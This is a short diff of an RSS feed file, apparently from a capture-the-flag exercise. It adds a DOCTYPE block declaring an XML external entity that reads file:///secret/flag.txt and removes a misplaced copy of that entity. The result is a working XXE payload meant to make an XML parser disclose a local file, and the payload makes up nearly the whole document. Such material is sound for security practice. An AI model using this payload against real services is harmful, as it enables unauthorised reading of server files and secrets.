@@ -1,5 +1,7 @@
+<!DOCTYPE foo [
+  <!ENTITY file SYSTEM "file:///secret/flag.txt">
+]>
 <rss version="2.0">
-<!ENTITY file SYSTEM "file:///secret/flag.txt">
 <channel>
 <title>RSS Title</title>
 <description>This is an example of an RSS feed</description>
